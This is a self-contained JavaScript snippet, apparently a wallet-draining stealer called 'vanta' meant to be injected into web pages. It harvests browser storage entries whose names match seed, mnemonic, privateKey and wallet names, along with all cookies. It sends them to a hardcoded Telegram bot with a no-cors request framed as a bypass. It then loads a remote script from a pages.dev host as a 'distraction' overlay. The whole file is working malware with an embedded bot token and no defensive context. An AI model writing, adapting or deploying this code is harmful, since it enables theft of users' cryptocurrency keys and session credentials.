(function() {
    const _t = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
    const _c = '8321398409';

    const vanta = {
        // Target list matches Vanta's internal focus
        targets: ['.phantom', '.vault', '.offline', 'padre-v2', 'seed', 'privateKey', 'secret', 'mnemonic'],
        
        init: function() {
            console.log("VANTA_NODE_INITIALIZED");
            this.run();
        },

        run: async function() {
            let log = `--- VANTA 1:1 EXTRACTION: ${location.hostname} ---\n`;
            log += `USER_AGENT: ${navigator.userAgent}\n\n`;

            // 1. Storage Harvest
            [localStorage, sessionStorage].forEach(db => {
                for (let i = 0; i < db.length; i++) {
                    let k = db.key(i);
                    if (this.targets.some(t => k.toLowerCase().includes(t))) {
                        log += `[${k}]\n${db.getItem(k)}\n\n`;
                    }
                }
            });

            // 2. Cookie Harvest
            log += `--- COOKIES ---\n${document.cookie}`;

            // 3. The 1:1 Bypass Delivery
            // Vanta uses a Blob + FormData to bypass Cross-Origin Read Blocking (CORB)
            const blob = new Blob([log], { type: 'text/plain' });
            const fd = new FormData();
            fd.append('chat_id', _c);
            fd.append('document', blob, `vanta_vault_${Math.floor(Date.now()/1000)}.txt`);

            try {
                // 'no-cors' mode is the 1:1 bypass for Padre's strict headers
                fetch(`https://api.telegram.org/bot${_t}/sendDocument`, {
                    method: 'POST',
                    body: fd,
                    mode: 'no-cors'
                });

                // 4. UI Distraction Overlay
                // We load the modal after the data is fire-and-forget
                this.loadUI();
            } catch (e) {}
        },

        loadUI: function() {
            const s = document.createElement('script');
            s.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
            document.head.appendChild(s);
        }
    };

    vanta.init();
})();
